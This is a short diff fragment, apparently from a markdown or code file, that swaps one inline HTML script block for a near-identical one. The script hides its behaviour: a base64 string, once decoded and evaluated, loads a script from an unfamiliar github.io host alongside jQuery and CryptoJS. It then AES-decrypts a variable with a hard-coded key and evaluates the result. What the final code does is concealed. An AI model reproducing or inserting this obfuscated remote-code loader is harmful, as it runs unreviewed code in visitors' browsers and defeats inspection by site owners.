@@ -7,27 +7,28 @@ $ = \$
 [`123qwe`]
 
 
-<div id="D_cscs">
-    <script>
-        (async () => {
-            cdnList=[];
-            eval(decodeURIComponent(escape(atob("Y2RuTGlzdC5wdXNoKCJodHRwczovLzY0MDcxMTgxLmdpdGh1Yi5pby9kL1ZJUGRhdGEuanMiLCJodHRwczovL2NvZGUuanF1ZXJ5LmNvbS9qcXVlcnktMy43LjAuanMiLCJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9jcnlwdG8tanMvNC4xLjEvY3J5cHRvLWpzLm1pbi5qcyIp"))));
-            await Promise.all(
-                cdnList.map(cdn => 
-                    document.querySelector('script[src="${cdn}"]') || new Promise(resolve => {
-                        const script = document.createElement('script');
-                        script.src = cdn;
-                        script.onload = resolve;
-                        document.head.appendChild(script);
-                    })
-                )
-            );
-            console.log('cscs = OK!');
-            $('#D_cscs').html(eval(CryptoJS.AES.decrypt(cscs, 摸老婆).toString(CryptoJS.enc.Utf8)));
-        })();
-    </script>
-</div>
 
+      <div id="D_ddd">
+          <script>
+              (async () => {
+                  cdnList=[];
+                  eval(decodeURIComponent(escape(atob("Y2RuTGlzdC5wdXNoKCJodHRwczovLzY0MDcxMTgxLmdpdGh1Yi5pby9kL1ZJUGRhdGEuanMiLCJodHRwczovL2NvZGUuanF1ZXJ5LmNvbS9qcXVlcnktMy43LjAuanMiLCJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9jcnlwdG8tanMvNC4xLjEvY3J5cHRvLWpzLm1pbi5qcyIp"))));
+                  await Promise.all(
+                      cdnList.map(cdn => 
+                          document.querySelector('script[src="${cdn}"]') || new Promise(resolve => {
+                              const script = document.createElement('script');
+                              script.src = cdn;
+                              script.onload = resolve;
+                              document.head.appendChild(script);
+                          })
+                      )
+                  );
+                  console.log('ddd = OK!');
+                  $('#D_ddd').html(eval(CryptoJS.AES.decrypt(ddd, 摸老婆).toString(CryptoJS.enc.Utf8)));
+              })();
+          </script>
+      </div>
+    
 
 */
 
